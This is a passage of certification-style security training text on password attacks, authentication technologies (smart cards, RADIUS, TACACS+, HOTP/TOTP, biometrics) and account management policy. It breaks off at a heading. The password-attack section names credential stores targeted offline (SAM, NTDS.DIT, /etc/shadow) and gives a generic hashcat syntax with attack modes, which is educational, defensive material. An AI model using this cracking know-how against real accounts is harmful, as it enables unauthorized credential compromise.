MS-CHAPv2 is Microsoft's implementation of CHAP. Because of the way it uses vulnerable NTLM hashes, MS-CHAP should not be deployed without the protection of a secure connection tunnel so that the credentials being passed are encrypted. 

PASSWORD ATTACKS

When a user chooses a password, the password is converted to a hash using a cryptographic function, such as MD5 or SHA. This means that, in theory, no one except the user (not even the system administrator) knows the password, because the plaintext should not be recoverable from the hash. 
### Plaintext/Unencrypted Attacks
A plaintext/unencrypted attack exploits password storage or a network authentication protocol that does not use encryption. Passwords must never be saved to an unmanaged file. One common source of credential breaches is passwords embedded in application code that has subsequently been uploaded to a public repository.
### Online Attacks
An online password attack is where the threat actor interacts with the authentication service directly—a web login form or VPN gateway, for instance. The attacker submits passwords using either a database of known passwords (and variations) or a list of passwords that have been cracked offline.

Also, be aware that there are databases of username and password/password hash combinations for multiple accounts stored across the Internet. These details derive from successful hacks of various companies' systems. These databases can be searched using a site such as [haveibeenpwned.com](https://haveibeenpwned.com/).

An online password attack can show up in audit logs as repeatedly failed logons and then a successful logon, or as successful logon attempts at unusual times or locations. Apart from ensuring the use of strong passwords by users, online password attacks can be mitigated by restricting the number or rate of logon attempts, and by shunning logon attempts from known bad IP addresses.

Note that restricting logons can be turned into a vulnerability as it exposes the account to denial of service attacks. The attacker keeps trying to authenticate, locking out valid users.
### Password Spraying
Password spraying is a horizontal brute-force online attack. This means that the attacker chooses one or more common passwords (for example, password or 123456) and tries them in conjunction with multiple usernames.
### Offline Attacks 
An offline attack means that the attacker has managed to obtain a database of password hashes, such as %SystemRoot%\System32\config\SAM, %SystemRoot%\NTDS\NTDS.DIT (the Active Directory credential store), or /etc/shadow. Once the password database has been obtained, the password cracker does not interact with the authentication system. The only indicator of this type of attack (other than misuse of the account in the event of a successful attack) is a file system audit log that records the malicious account accessing one of these files. Threat actors can also read credentials from host memory, in which case the only reliable indicator might be the presence of attack tools on a host.

If the attacker cannot obtain a database of passwords, a packet sniffer might be used to obtain the client response to a server challenge in a protocol such as NTLM or CHAP/MS-CHAP. Although these protocols avoid sending the hash of the password directly, the response is derived from it in some way. Password crackers can exploit weaknesses in a protocol to calculate the hash and match it to a dictionary word or brute force it.

BRUTE-FORCE AND DICTIONARY ATTACKS

Some password attacks exploit the weak credentials chosen by users. Others can exploit vulnerabilities in the storage mechanism. For example, the Windows SAM database can be configured to store hashes for compatibility with older versions (LM and NTLMv1 hashes). These legacy hashes are cryptographically weak and highly vulnerable to password cracking ([ldapwiki.com/wiki/LM%20hash](https://ldapwiki.com/wiki/LM%20hash)).
### Brute-Force Attack
A brute-force attack attempts every possible combination in the output space in order to match a captured hash and guess at the plaintext that generated it. The output space is determined by the number of bits used by the algorithm (128-bit MD5 or 256-bit SHA256, for instance). The larger the output space and the more characters that were used in the plaintext password, the more difficult it is to compute and test each possible hash to find a match. Brute-force attacks are heavily constrained by time and computing resources, and are therefore most effective at cracking short passwords. However, brute-force attacks distributed across multiple hardware components, like a cluster of high-end graphics cards, can be successful at cracking longer passwords.
### Dictionary and Rainbow Table Attacks
A dictionary attack can be used where there is a good chance of guessing the likely value of the plaintext, such as a non-complex password. The software generates hash values from a dictionary of plaintexts to try to match one to a captured hash. Rainbow table attacks refine the dictionary approach. The attacker uses a precomputed lookup table of all possible passwords and their matching hashes. Not all possible hash values are stored, as this would require too much memory. Values are computed in chains, and only the first and last values need to be stored. The hash value of a stored password can then be looked up in the table and the corresponding plaintext discovered.

Using a salt to add a random value to the stored plaintext helps to slow down rainbow table attacks, because the tables cannot be created in advance and must be recreated for each combination of password and salt value. Rainbow tables are also impractical when trying to discover long passwords (more than about 14 characters). UNIX and Linux password storage mechanisms use salt, but Windows does not. Consequently, in a Windows environment, it is even more important to enforce strong password policies.
### Hybrid Attack
A hybrid password attack uses a combination of attack methods when trying to crack a password. A typical hybrid password attack uses a combination of dictionary and brute force attacks. It is principally targeted against naïve passwords with inadequate complexity, such as james1. The password cracking algorithm tests dictionary words and names in combination with a mask that limits the number of variations to test for, such as adding numeric prefixes and/or suffixes. Other types of algorithms can be applied, based on what hackers know about how users behave when forced to select complex passwords that they don't really want to make hard to remember. Other examples might include substituting "s" with "5" or "o" with "0."

PASSWORD CRACKERS

Although there are some Windows tools, including the infamous Cain and L0phtcrack ([l0phtcrack.com](https://www.l0phtcrack.com/)) tools, most password crackers run primarily on Linux. Additionally, John the Ripper is an open source tool used for fast password cracking. Its primary focus is UNIX-based operating systems, but also Windows LanMan (LM) hashes. For example, a tool such as Hashcat ([hashcat.net/hashcat](https://hashcat.net/hashcat/)) is run using the following general syntax:

hashcat -m HashType -a AttackMode -o OutputFile InputHashFile

The input file should contain hashes of the same type, using the specified format ([hashcat.net/wiki/doku.php?id=example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)). Hashcat can be used with a single word list (dictionary mode -a 0) or multiple word lists (combinator mode -a 1). Mode -a 3 performs a brute-force attack, but this can be combined with a mask for each character position. This reduces the key space that must be searched and speeds up the attack. For example, you might learn or intuit that a company uses only letter characters in passwords. By omitting numeric and symbol characters, you can speed up the attack on each hash.



AUTHENTICATION MANAGEMENT

Users often adopt poor credential management practices that are very hard to control, such as using the same password for corporate networks and consumer websites. This makes enterprise network security vulnerable to data breaches from these websites. An authentication management solution for passwords mitigates this risk by using a device or service as a proxy for credential storage. The manager generates a unique, strong password for each web-based account. The user authorizes the manager to authenticate with each site using a master password.

Password managers can be implemented with a hardware token or as a software app:

- Password key—USB tokens for connecting to PCs and smartphones. Some can use nearfield communications (NFC) or Bluetooth as well as physical connectivity ([theverge.com/2019/2/22/18235173/the-best-hardware-security-keys-yubico-titan-key-u2f](https://www.theverge.com/2019/2/22/18235173/the-best-hardware-security-keys-yubico-titan-key-u2f)).
- Password vault—software-based password manager, typically using a cloud service to allow access from any device ([pcmag.com/picks/the-best-password-managers](https://www.pcmag.com/picks/the-best-password-managers)). A USB key is also likely to use a vault for backup. Most operating systems and browsers implement native password vaults. Examples include Windows Credential Manager and Apple's iCloud Keychain ([imore.com/icloud-keychain](https://www.imore.com/icloud-keychain)).

Topic 7C: Implement Authentication Technologies

Authentication technologies can be used as something you have or ownership/possession factor. Many organizations are deploying multifactor authentication systems based on smart cards and USB key fobs.

SMART-CARD AUTHENTICATION 

Smart-card authentication means programming cryptographic information onto a card equipped with a secure processing chip. The chip stores the user's digital certificate, the private key associated with the certificate, and a personal identification number (PIN) used to activate the card. 

For Kerberos authentication, smart-card logon works as follows: 

1. The user presents the smart card to a reader and is prompted to enter a PIN.
1. Inputting the correct PIN authorizes the smart card's cryptoprocessor to use its private key to create a Ticket Granting Ticket (TGT) request, which is transmitted to the authentication server (AS). 
1. The AS is able to decrypt the request because it has a matching public key and trusts the user's certificate, either because it was issued by a local certification authority or by a third-party CA that is a trusted root CA.
1. The AS responds with the TGT and Ticket Granting Service (TGS) session key.

KEY MANAGEMENT DEVICES

When using public key infrastructure (PKI) for smart-card authentication, the security of the private key issued to each user is critical. One problem is that only the user should ever be in ownership of the private key. If the network administrator is able to view these keys, they can impersonate any subject. Various technologies can be used to avoid the need for an administrator to generate a private key and transmit it to the user:

- Smart card—some cards are powerful enough to generate key material using the cryptoprocessor embedded in the card.
- USB key—a cryptoprocessor can also be implemented in the USB form factor.
- Trusted Platform Module (TPM)—a secure cryptoprocessor enclave implemented on a PC, laptop, smartphone, or network appliance. The TPM is usually a module within the CPU. Modification of TPM data is only permitted by highly trusted processes. A TPM can be used to present a virtual smart card ([docs.microsoft.com/en-us/windows/security/identity-protection/virtual-smart-cards/virtual-smart-card-overview](https://docs.microsoft.com/en-us/windows/security/identity-protection/virtual-smart-cards/virtual-smart-card-overview)).

Smart cards, USB keys, and virtual smart cards are provisioned as individual devices. Often keys need to be provisioned to non-user devices too, such as servers and network appliances. A hardware security module (HSM) is a network appliance designed to perform centralized PKI management for a network of devices. This means that it can act as an archive or escrow for keys in case of loss or damage. Compared to using a general-purpose server for certificate services, HSMs are optimized for the role and so have a smaller attack surface. HSMs are designed to be tamper-evident to mitigate risk of insider threat, and can also provide enterprise-strength cryptographically secure pseudorandom number generators (CSPRNGs). HSMs can be implemented in several form factors, including rack-mounted appliances, plug-in PCIe adapter cards, and USB-connected external peripherals.

EXTENSIBLE AUTHENTICATION PROTOCOL/IEEE 802.1X

The smart-card authentication process described earlier is used for Kerberos authentication where the computer is attached to the local network and the user is logging on to Windows. Authentication may also be required in other contexts:

- When the user is accessing a wireless network and needs to authenticate with the network database.
- When a device is connecting to a network via a switch and network policies require the user to be authenticated before the device is allowed to communicate.
- When the user is connecting to the network over a public network via a virtual private network (VPN).

In these scenarios, the Extensible Authentication Protocol (EAP) provides a framework for deploying multiple types of authentication protocols and technologies. EAP allows lots of different authentication methods, but many of them use a digital certificate on the server and/or client machines. This allows the machines to establish a trust relationship and create a secure tunnel to transmit the user credential or to perform smart-card authentication without a user password.

Where EAP provides the authentication mechanisms, the IEEE 802.1X Port-based Network Access Control (NAC) protocol provides the means of using an EAP method when a device connects to an Ethernet switch port, wireless access point (with enterprise authentication configured), or VPN gateway. 802.1X uses authentication, authorization, and accounting (AAA) architecture:

- Supplicant—the device requesting access, such as a user's PC or laptop.
- Network access server (NAS)—edge network appliances, such as switches, access points, and VPN gateways. These are also referred to as RADIUS clients or authenticators.
- AAA server—the authentication server, positioned within the local network.

With AAA, the NAS devices do not have to store any authentication credentials. They forward this data between the AAA server and the supplicant. There are two main types of AAA server: RADIUS and TACACS+.

REMOTE AUTHENTICATION DIAL-IN USER SERVICE

The Remote Authentication Dial-in User Service (RADIUS) standard is published as an Internet standard. There are several RADIUS server and client products.

The Network Access Server (NAS)/Network Access Point (NAP) device (RADIUS client) is configured with the IP address of the RADIUS server and with a shared secret. This allows the client to authenticate to the server. Remember that the client is the access device (switch, access point, or VPN gateway), not the user's PC or laptop. A generic RADIUS authentication workflow proceed as follows:

1. The user's device (the supplicant) makes a connection to the NAS appliance, such as an access point, switch, or remote access server. 
2. The NAS prompts the user for their authentication credentials. RADIUS supports PAP, CHAP, and EAP. Most implementations now use EAP, as PAP and CHAP are not secure. If EAP credentials are required, the NAS enables the supplicant to transmit EAP over LAN (EAPoL) data, but does not allow any other type of network traffic.
2. The supplicant submits the credentials as EAPoL data. The RADIUS client uses this information to create an Access-Request RADIUS packet, encrypted using the shared secret. It sends the Access-Request to the AAA server using UDP on port 1812 (by default).
2. The AAA server decrypts the Access-Request using the shared secret. If the Access-Request cannot be decrypted (because the shared secret is not correctly configured, for instance), the server does not respond.
2. With EAP, there will be an exchange of Access-Challenge and Access-Request packets as the authentication method is set up and the credentials verified. The NAS acts as a pass-thru, taking RADIUS messages from the server, and encapsulating them as EAPoL to transmit to the supplicant.
2. At the end of this exchange, if the supplicant is authenticated, the AAA server responds with an Access-Accept packet; otherwise, an Access-Reject packet is returned.

Optionally, the NAS can use RADIUS for accounting (logging). Accounting uses port 1813. The accounting server can be different from the authentication server.

TERMINAL ACCESS CONTROLLER ACCESS-CONTROL SYSTEM

RADIUS is used primarily for network access control. AAA services are also used for the purpose of centralizing logins for the administrative accounts for network appliances. This allows network administrators to be allocated specific privileges on each switch, router, access point, and firewall. Whereas RADIUS can be used for this network appliance administration role, the Cisco-developed Terminal Access Controller Access-Control System Plus (TACACS+) is specifically designed for this purpose (<https://www.cisco.com/c/en/us/support/docs/security-vpn/remote-authentication-dial-user-service-radius/13838-10.html>):

- TACACS+ uses TCP communications (over port 49), and this reliable, connection-oriented delivery makes it easier to detect when a server is down.
- All the data in TACACS+ packets is encrypted (except for the header identifying the packet as TACACS+ data), rather than just the authentication data. This ensures confidentiality and integrity when transferring critical network infrastructure data.
- Authentication, authorization, and accounting functions are discrete. Many device management tasks require reauthentication (similar to having to re-enter a password for sudo or UAC) and per-command authorizations and privileges for users, groups, and roles. TACACS+ supports this workflow better than RADIUS.

TOKEN KEYS AND STATIC CODES

Smart-card authentication works well when you have close control over user accounts and the devices used on the network. Other types of ownership-based authentication technologies use various hardware and software tokens. These avoid some of the management issues of using the digital certificates required by smart-card authentication.

A one-time password (OTP) is one that is generated automatically, rather than being chosen by a user, and used only once. Consequently, it is not vulnerable to password guessing or sniffing attacks. An OTP is generated using some sort of hash function on a secret value plus a synchronization value (seed), such as a timestamp or counter.

The SecurID token from RSA represents one popular implementation of an OTP token key. The device generates a passcode based on the current time and a secret key coded into the device. The code is entered along with a PIN or password known only to the user. Network access devices must be configured with an agent to intercept the credentials and direct them to an Authentication Manager server for validation. This server can integrate with directory products, such as AD.

There are also simpler token keys and smart cards that simply transmit a static token programmed into the device. For example, many building entry systems work on the basis of static codes. These mechanisms are highly vulnerable to cloning and replay attacks.

There are many other ways of implementing hardware token keys. For example, a Fast Identity Online (FIDO) Universal Second Factor (U2F) USB token registers a public key with the authentication service. The authentication mechanism then requires the private key locked to the token, which is authorized using PIN or fingerprint activation ([fidoalliance.org/showcase/fido-u2f-security-key](https://fidoalliance.org/showcase/fido-u2f-security-key/)). This can also be used with the Windows Hello authentication provider ([microsoft.com/security/blog/2019/06/10/advancing-windows-10-passwordless-platform](https://www.microsoft.com/security/blog/2019/06/10/advancing-windows-10-passwordless-platform/)).

OPEN AUTHENTICATION

The Initiative for Open Authentication (OATH) is an industry body established with the aim of developing an open, strong authentication framework. Open means a system that any enterprise can link into to perform authentication of users and devices across different networks. Strong means that the system is based not just on passwords, but also on 2- or 3-factor authentication or on 2-step verification. OATH has developed two algorithms for implementing one time passwords (OTPs).
### HMAC-Based One-Time Password Algorithm (HOTP)
HMAC-based One-time Password Algorithm (HOTP) is an algorithm for token-based authentication (<https://www.ietf.org/rfc/rfc4226.html>). The authentication server and client token are configured with the same shared secret. This should be an 8-byte value generated by a cryptographically strong random number generator. The token could be a fob-type device or implemented as a smartphone authentication/authenticator app. The shared secret can be transmitted to the smartphone app as a QR code image acquirable by the phone's camera so that the user doesn't have to type anything. Obviously, it is important that no other device is able to acquire the shared secret. The shared secret is combined with a counter to create a one-time password when the user wants to authenticate. The device and server both compute the hash and derive an HOTP value that is 6-8 digits long. This is the value that the user must enter to authenticate with the server. The counter is incremented by one.

The server is configured with a counter window to cope with the circumstance that the device and server counters move out of sync. This could happen if the user generates an OTP but does not use it, for instance.
### Time-Based One-Time Password Algorithm (TOTP)
The Time-based One-time Password Algorithm (TOTP) is a refinement of the HOTP ([https://datatracker.ietf.org/doc/html/rfc6238](https://nam02.safelinks.protection.outlook.com/?url=https%3A%2F%2Fdatatracker.ietf.org%2Fdoc%2Fhtml%2Frfc6238&data=04%7C01%7Cdandries%40comptia.org%7C79b46abac0f04b29ecae08d9bef00625%7C8c39a7ffe0774d1c9a1c7431fe5eb465%7C0%7C0%7C637750760424782889%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000&sdata=iBZcXWlOthfRUWPX5dGZdB8zh1PoUKo3picunapbngM%3D&reserved=0)). One issue with HOTP is that tokens can be allowed to persist unexpired, raising the risk that an attacker might be able to obtain one and decrypt data in the future. In TOTP, the HMAC is built from the shared secret plus a value derived from the device's and server's local timestamps. TOTP automatically expires each token after a short window (60 seconds, for instance). For this to work, the client device and server must be closely time-synchronized. One well-known implementation of HOTP and TOTP is Google Authenticator.

2-STEP VERIFICATION

2-step verification or out-of-band mechanisms generate a software token on a server and send it to a resource assumed to be safely controlled by the user. The token can be transmitted to the device in a number of ways:

- Short Message Service (SMS)—the code is sent as a text to the registered phone number.
- Phone call—the code is delivered as an automated voice call to the registered phone number.
- Push notification—the code is sent to a registered authenticator app on the PC or smartphone.
- Email—the code is sent to a registered email account.

These mechanisms are sometimes also described as 2-factor authentication (2FA). However, anyone intercepting the code within the time frame could enter it as something you know without ever possessing or looking at the device itself ([auth0.com/blog/why-sms-multi-factor-still-matters](https://auth0.com/blog/why-sms-multi-factor-still-matters/)).

Topic 7D: Summarize Biometrics Authentication Concepts

Biometric authentication mechanisms allow users to access an account through a physiological feature (fingerprint or iris pattern, for instance) or behavioral pattern. 

BIOMETRIC AUTHENTICATION 

The first step in setting up biometric authentication is enrollment. The chosen biometric information is scanned by a biometric reader and converted to binary information. There are generally two steps in the scanning process:

1. A sensor module acquires the biometric sample from the target.
1. A feature extraction module records the features in the sample that uniquely identify the target.

The biometric template is kept in the authentication server's database. When the user wants to access a resource, he or she is re-scanned, and the scan is compared to the template. If they match to within a defined degree of tolerance, access is granted.

Several pattern types can be used to identify people biometrically. These can be categorized as physical (fingerprint, eye, and facial recognition) or behavioral (voice, signature, and typing pattern matching). Key metrics and considerations used to evaluate the efficacy rate of biometric pattern acquisition and matching and suitability as an authentication mechanism include the following:

- False Rejection Rate (FRR)—where a legitimate user is not recognized. This is also referred to as a Type I error or false non-match rate (FNMR). FRR is measured as a percentage.
- False Acceptance Rate (FAR)—where an interloper is accepted (Type II error or false match rate [FMR]). FAR is measured as a percentage.

  False rejection cause inconvenience to users, but false acceptance can lead to security breaches, and so is usually considered the most important metric.
- Crossover Error Rate (CER)—the point at which FRR and FAR meet. The lower the CER, the more efficient and reliable the technology.

  Errors are reduced over time by tuning the system. This is typically accomplished by adjusting the sensitivity of the system until CER is reached.
- Throughput (speed)—the time required to create a template for each user and the time required to authenticate. This is a major consideration for high traffic access points, such as airports or railway stations.
- Failure to Enroll Rate (FER)—incidents in which a template cannot be created and matched for a user during enrollment.
- Cost/implementation—some scanner types are more expensive, whereas others are not easy to incorporate on mobile devices.
- Users can find it intrusive and threatening to privacy.
- The technology can be discriminatory or inaccessible to those with disabilities. 

BEHAVIORAL TECHNOLOGIES

"Something you do" refers to behavioral biometric pattern recognition. Rather than scan some attribute of your body, a template is created by analyzing a behavior, such as typing, writing a signature, or walking/moving. The variations in motion, pressure, or gait are supposed to uniquely verify each individual. In practice, however, these methods are subject to higher error rates, and are much more troublesome for a subject to perform.

- Voice recognition—relatively cheap, as the hardware and software required are built into many standard PCs and mobiles. However, obtaining an accurate template can be difficult and time-consuming. Background noise and other environmental factors can also interfere with logon. Voice is also subject to impersonation.
- Gait analysis—produces a template from human movement (locomotion). The technologies can either be camera-based or use smartphone features, such as an accelerometer and gyroscope.
- Signature recognition—signatures are relatively easy to duplicate, but it is more difficult to fake the actual signing process. Signature matching records the user applying their signature (stroke, speed, and pressure of the stylus).
- Typing—matches the speed and pattern of a user’s input of a passphrase.

Some biometric and behavioral technologies might be used for purposes other than logon authentication:

- Biometric identification refers to matching people to a database, as opposed to authenticating them per se. For example, if an individual crossing the floor of the data center does not produce a match for gait analysis, the system may raise a security alert (<https://www.g4s.com/news-and-insights/insights/2017/12/06/keeping-data-centres-secure>).
- Continuous authentication verifies that the user who logged on is still operating the device. For example, if a user successfully authenticates to a smartphone using a fingerprint, the device continues to monitor key motion and pressure statistics as the device is held and manipulated. If this deviates from the baseline, detection system would lock the phone. This sort of technology is not available on the market (at the time of writing), but it is the subject of numerous research projects.

Lesson 8: Implementing Identity and Account Management Controls

As well as ensuring that only valid users and devices connect to managed networks and devices, you must ensure that these subjects are authorized with only necessary permissions and privileges to access and change resources. These tasks are complicated by the need to manage identities across on-premises networks and cloud services. Also, account security depends on effective organizational policies for personnel and security training.

Topic 8A: Implement Identity and Account Types

Least privilege is the principle at the heart of most organizational security policies. Identity and privilege management helps an organization to account for the actions of both regular and administrative users. These systems are complicated by the presence of default, shared, guest, and device account types that are difficult to associate with a single identity. 

IDENTITY MANAGEMENT CONTROLS

On a private network, a digital identity can be represented by an account. The network administrator ensures the integrity of the server hosting the accounts, while each user is responsible for protecting the credentials so that only they can authenticate to the account and use it. On public networks and as an extra layer of protection on private networks, the account may also be identified by some cryptographic material.
### Certificates and Smart Cards
Public key infrastructure (PKI) allows the management of digital identities, where a certificate authority (CA) issues certificates to validated subjects (users and servers). The subject identity can be trusted by any third party that also trusts the CA.

The certificate contains the subject's public key and is signed by the CA's private key. These public keys allow third parties to verify the certificate and the signature. The subject's public key is part of a pair with a linked private key. The private key must be kept secret. It can be stored on the computer, either in the file system or in a trusted platform module (TPM) chip. Alternatively, a user's certificate and private key can be stored on a smart card or USB key and used to authenticate to different PCs and mobile devices.
### Tokens
It is inconvenient for users to authenticate to each application they need to use. In a single sign-on system, the user authenticates to an identity provider (IdP) and receives a cryptographic token. The user can present that token to compatible applications as proof they are authenticated, and receive authorizations from the application. With a token, there is always a risk that a malicious actor will be able to capture and replay it. The application protocol that makes use of tokens must be designed to resist this type of attack.
### Identity Providers
The identity provider is the service that provisions the user account and processes authentication requests. On a private network, these identity directories and application authorization services can be operated locally. The same site operates both identity provision and application provision. Most networks now make use of third-party cloud services, however. In this scenario, various protocols and frameworks are available to implement federated identity management across web-based services. This means that a user can create a digital identity with one provider, but other sites can use that identity to authorize use of an application.

BACKGROUND CHECK AND ONBOARDING POLICIES 

Identity and access management (IAM) involves both IT/security procedures and technologies and Human Resources (HR) policies. Personnel management policies are applied in three phases:

- Recruitment (hiring)—locating and selecting people to work in particular job roles. Security issues here include screening candidates and performing background checks.
- Operation (working)—it is often the HR department that manages the communication of policy and training to employees (though there may be a separate training and personal development department within larger organizations). As such, it is critical that HR managers devise training programs that communicate the importance of security to employees.
- Termination or separation (firing or retiring)—whether an employee leaves voluntarily or involuntarily, termination is a difficult process, with numerous security implications. 
### Background Check
A background check determines that a person is who they say they are and are not concealing criminal activity, bankruptcy, or connections that would make them unsuitable or risky. Employees working in high confidentiality environments or with access to high value transactions will obviously need to be subjected to a greater degree of scrutiny. For some jobs, especially federal jobs requiring a security clearance, background checks are mandatory. Some background checks are performed internally, whereas others are done by an external third party. 
### Onboarding
Onboarding at the HR level is the process of welcoming a new employee to the organization. The same sort of principle applies to taking on new suppliers or contractors. Some of the same checks and processes are used in creating customer and guest accounts. As part of onboarding, the IT and HR function will combine to create an account for the user to access the computer system, assign the appropriate privileges, and ensure the account credentials are known only to the valid user. These functions must be integrated, to avoid creating accidental configuration vulnerabilities, such as IT creating an account for an employee who is never actually hired. Some of the other tasks and processes involved in onboarding include:

- Secure transmission of credentials—creating and sending an initial password or issuing a smart card securely. The process needs protection against rogue administrative staff. Newly created accounts with simple or default passwords are an easily exploitable backdoor.
- Asset allocation—provision computers or mobile devices for the user or agree to the use of bring-your-own-device handsets.
- Training/policies—schedule appropriate security awareness and role-relevant training and certification. 
### Nondisclosure Agreement (NDA)
The terms of an nondisclosure agreement (NDA) might be incorporated within the employee contract or could be a separate document. When an employee or contractor signs an NDA, they are asserting that they will not share confidential information with a third party. 

PERSONNEL POLICIES FOR PRIVILEGE MANAGEMENT

HR and IT must collaborate to ensure effective privilege management. These policies aim to ensure that the risk of insider threat is minimized. 
### Separation of Duties 
Separation of duties is a means of establishing checks and balances against the possibility that critical systems or procedures can be compromised by insider threats. Duties and responsibilities should be divided among individuals to prevent ethical conflicts or abuse of powers. 

An employee is supposed to work for the interests of their organization exclusively. A situation where someone can act in his or her own interest, personally, or in the interests of a third party is said to be a conflict of interest.

Separation of duties means that employees must be constrained by security policies:

- Standard operating procedures (SOPs) mean that an employee has no excuse for not following protocol in terms of performing these types of critical operations.
- Shared authority means that no one user is able to take action or enable changes on his or her own authority. At least two people must authorize the change. One example is separating responsibility for purchasing (ordering) from that of authorizing payment. Another is that a request to create an account should be subject to approval and oversight.

Separation of duties does not completely eliminate risk because there is still the chance of collusion between two or more people. This, however, is a much less likely occurrence than a single rogue employee.
### Least Privilege
Least privilege means that a user is granted sufficient rights to perform his or her job and no more. This mitigates risk if the account should be compromised and fall under the control of a threat actor. Authorization creep refers to a situation where a user acquires more and more rights, either directly or by being added to security groups and roles. Least privilege should be ensured by closely analyzing business workflows to assess what privileges are required and by performing regular account audits. 
### Job Rotation
Job rotation (or rotation of duties) means that no one person is permitted to remain in the same job for an extended period. For example, managers may be moved to different departments periodically, or employees may perform more than one job role, switching between them throughout the year. Rotating individuals into and out of roles, such as the firewall administrator or access control specialist, helps an organization ensure that it is not tied too firmly to any one individual because vital institutional knowledge is spread among trusted employees. Job rotation also helps prevent abuse of power, reduces boredom, and enhances individuals' professional skills. 
### Mandatory Vacation
Mandatory vacation means that employees are forced to take their vacation time, during which someone else fulfills their duties. The typical mandatory vacation policy requires that employees take at least one vacation a year in a full-week increment so that they are away from work for at least five days in a row. During that time, the corporate audit and security employees have time to investigate and discover any discrepancies in employee activity. 

OFFBOARDING POLICIES

An exit interview (or offboarding) is the process of ensuring that an employee leaves a company gracefully. Offboarding is also used when a project using contractors or third parties ends. In terms of security, there are several processes that must be completed:

- Account management—disable the user account and privileges. Ensure that any information assets created or managed by the employee but owned by the company are accessible (in terms of encryption keys or password-protected files).
- Company assets—retrieve mobile devices, keys, smart cards, USB media, and so on. The employee will need to confirm (and in some cases prove) that they have not retained copies of any information assets.
- Personal assets—wipe employee-owned devices of corporate data and applications. The employee may also be allowed to retain some information assets (such as personal emails or contact information), depending on the policies in force.

The departure of some types of employees should trigger additional processes to re-secure network systems. Examples include employees with detailed knowledge of security systems and procedures, and access to shared or generic account credentials. These credentials must be changed immediately. 

SECURITY ACCOUNT TYPES AND CREDENTIAL MANAGEMENT

Operating systems, network appliances, and network directory products use some standard account types as the basis of a privilege management system. These include standard user, administrative user, security group accounts, and service accounts.

Standard users have limited privileges, typically with access to run programs and to create and modify files belonging only to their profile. 
### Credential Management Policies for Personnel
Improper credential management continues to be one of the most fruitful vectors for network attacks. If an organization must continue to rely on password-based credentials, its usage needs to be governed by strong policies and training.

A password policy instructs users on best practice in choosing and maintaining passwords. More generally, a credential management policy should instruct users on how to keep their authentication method secure, whether this be a password, smart card, or biometric ID. Password protection policies mitigate against the risk of attackers being able to compromise an account and use it to launch other attacks on the network. The credential management policy also needs to alert users to diverse types of social engineering attacks. Users need to be able to spot phishing and pharming attempts, so that they do not enter credentials into an unsecure form or spoofed site. 
### Guest Accounts
A guest account is a special type of shared account with no password. It allows anonymous and unauthenticated access to a resource. The Windows OS creates guest user and group accounts when installed, but the guest user account is disabled by default. Guest accounts are also created when installing web services, as most web servers allow unauthenticated access.

SECURITY GROUP-BASED PRIVILEGES 

As well as an account to use resources on the local computer, users also typically need accounts to use resources on the network. In fact, most accounts are created on a network directory and then given permission to log in on certain computer or workstation objects.

One approach to network privilege management is to assign privileges directly to user accounts. This model is only practical if the number of users is small. With large number of users, it is difficult to audit and to apply privilege policies consistently.

The concept of a security group account simplifies and centralizes the administrative process of assigning rights. Rather than assigning rights directly, the system owner assigns them to security group accounts. User accounts gain rights by being made a member of a security group. A user can be a member of multiple groups and can therefore receive rights and permissions from several sources.

ADMINISTRATOR/ROOT ACCOUNTS

Administrative or privileged accounts are able to install and remove apps and device drivers, change system-level settings, and access any object in the file system. Ideally, only accounts that have been created and assigned specific permissions should have this kind of elevated privilege. In practice, it is very hard to eliminate the presence of default administrator accounts. A default account is one that is created by the operating system or application when it is installed. The default account has every permission available. In Windows, this account is called Administrator; in Linux, it is called root. This type of account is also referred to as a superuser.
### Generic Administrator Account Management
Superuser accounts directly contradict the principles of least privilege and separation of duties. Consequently, superuser accounts should be prohibited from logging on in normal circumstances. The default superuser account should be restricted to disaster recovery operations only. In Windows, the account is usually disabled by default and can be further restricted using group policy ([docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-h--securing-local-administrator-accounts-and-groups](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-h--securing-local-administrator-accounts-and-groups)). The first user account created during setup has superuser permissions, however.

On Windows networks, you also need to distinguish between local administrators and domain administrators. The scope of a local administrator's privileges is restricted to the machine hosting the account. Domain administrators can have privileges over any machine joined to the domain.

Ubuntu Linux follows a similar approach; the root account is configured with no password and locked, preventing login. An alternate superuser account is created during setup. In other Linux distributions, a password is usually set at install time. This password must be kept as secure as is possible.
### Administrator Credential Policies 
The default superuser should be replaced with one or more named accounts with sufficient elevated privileges for a given job role. This can be referred to as generic account prohibition. It means that administrative activity can be audited and the system as a whole conforms to the property of non-repudiation. 

It is a good idea to restrict the number of administrative accounts as much as possible. The more accounts there are, the more likely it is that one of them will be compromised. On the other hand, you do not want administrators to share accounts, as that compromises accountability.

Users with administrative privileges must take the greatest care with credential management. Privilege-access accounts must use strong passwords and ideally multifactor authentication (MFA). 
### Default Security Groups
Most operating systems also create default security groups, with a default set of permissions. In Windows, privileges are assigned to local group accounts (the Users and Administrators groups) rather than directly to user accounts. Custom security groups with different permissions can be created to enforce the principle of least privilege. In Linux, privileged accounts are typically configured by adding either a user or a group account to the /etc/sudoers file ([linux.com/training-tutorials/start-fine-tuning-sudo-linux](https://www.linux.com/training-tutorials/start-fine-tuning-sudo-linux/)).

SERVICE ACCOUNTS

Service accounts are used by scheduled processes and application server software, such as databases. Windows has several default service account types. These do not accept user interactive logons but can be used to run processes and background services:

- System—has the most privileges of any Windows account. The local system account creates the host processes that start Windows before the user logs on. Any process created using the system account will have full privileges over the local computer.
- Local Service—has the same privileges as the standard user account. It can only access network resources as an anonymous user.
- Network Service—has the same privileges as the standard user account but can present the computer's account credentials when accessing network resources.

Linux also uses the concept of service accounts to run non-interactive daemon processes, such as web servers and databases. These accounts are usually created by the server application package manager. Users can be prevented from logging into these accounts (often by setting the password to an unknown value and denying shell access).

If a named account is manually configured to run a service, the password for the service account will effectively be shared by multiple administrators. Many operating systems support automatic provisioning of credentials for service accounts, reducing the risk of insider threat ([techcommunity.microsoft.com/t5/ask-the-directory-services-team/managed-service-accounts-understanding-implementing-best/ba-p/397009](https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/managed-service-accounts-understanding-implementing-best/ba-p/397009)).

SHARED/GENERIC/DEVICE ACCOUNTS AND CREDENTIALS

